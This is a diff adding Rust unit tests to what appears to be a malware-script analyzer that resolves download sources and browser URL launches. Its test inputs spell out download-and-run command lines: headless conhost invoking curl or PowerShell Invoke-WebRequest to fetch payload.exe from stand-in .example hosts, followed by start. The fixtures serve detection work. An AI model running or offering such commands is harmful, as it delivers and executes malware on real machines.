@@ -2419,6 +2419,48 @@ C:\Users\Public\ci.tmp /w:C:\Users\Public
     }
 
     #[test]
+    fn start_local_target_resolves_prior_conhost_cmd_c_download_source_url() {
+        let report = analyze(
+            br#"conhost.exe --headless cmd.exe /c curl.exe -L https://conhost-cmd-start.example/payload.exe -o C:\Users\Public\payload.exe
+start "" "C:\Users\Public\payload.exe""#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"start "C:\Users\Public\payload.exe""#
+                            && url == "https://conhost-cmd-start.example/payload.exe"
+                )
+            }),
+            "start local target did not resolve prior conhost cmd /c download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_local_target_resolves_prior_conhost_powershell_download_source_url() {
+        let report = analyze(
+            br#"conhost.exe --headless powershell.exe -NoP -Command "Invoke-WebRequest -Uri https://conhost-ps-start.example/payload.exe -OutFile C:\Users\Public\payload.exe"
+start "" "C:\Users\Public\payload.exe""#,
+            &AnalyzeConfig::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == r#"start "C:\Users\Public\payload.exe""#
+                            && url == "https://conhost-ps-start.example/payload.exe"
+                )
+            }),
+            "start local target did not resolve prior conhost PowerShell download source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn start_current_dir_local_target_resolves_prior_download_source_url() {
         let report = analyze(
             br#"curl -o payload.hta https://start-dot-source.example/payload.hta
@@ -6165,6 +6207,29 @@ mod line_cap_tests {
     }
 
     #[test]
+    fn default_config_preserves_long_single_line() {
+        let payload = "A".repeat(70 * 1024);
+        let script = format!("echo {payload}\r\n");
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            !report.deobfuscated.contains("…[truncated]"),
+            "default config should not truncate forensic output"
+        );
+        assert!(
+            report.deobfuscated.contains(&payload),
+            "default config dropped long line payload"
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::LineTruncated { .. })),
+            "default config emitted LineTruncated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn truncated_line_url_in_tail_is_rescued_direct() {
         // Direct test of `rescue_truncated_urls` — proves the rescue logic
         // works in isolation. The `via_analyze` test below verifies the
@@ -9335,17 +9400,49 @@ hh C:/Temp/payload.chm::/index.htm"#,
         );
         interpret_line("msedge browser-direct.example/lure.pdf", &mut env);
         interpret_line("chrome https://browser-direct.example/payload[1]", &mut env);
+        interpret_line("edge https://edge-direct.example/lure", &mut env);
+        interpret_line("vivaldi vivaldi-direct.example/panel", &mut env);
 
         for expected in [
             "https://explorer-direct.example/privacy/",
             "http://browser-direct.example/lure.pdf",
             "https://browser-direct.example/payload[1]",
+            "https://edge-direct.example/lure",
+            "http://vivaldi-direct.example/panel",
         ] {
             assert!(
                 env.traits
                     .iter()
                     .any(|t| matches!(t, Trait::UrlLaunch { url, .. } if url == expected)),
                 "missing browser UrlLaunch for {expected}: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
+    fn browser_attached_url_flags_emit_url_launch() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            "chrome.exe --app=https://browser-app.example/panel",
+            &mut env,
+        );
+        interpret_line("msedge.exe --url=browser-url.example/lure.pdf", &mut env);
+        interpret_line(
+            "firefox.exe -url:https://browser-colon.example/doc",
+            &mut env,
+        );
+
+        for expected in [
+            "https://browser-app.example/panel",
+            "http://browser-url.example/lure.pdf",
+            "https://browser-colon.example/doc",
+        ] {
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::UrlLaunch { url, .. } if url == expected)),
+                "missing browser attached-flag UrlLaunch for {expected}: {:?}",
                 env.traits
             );
         }
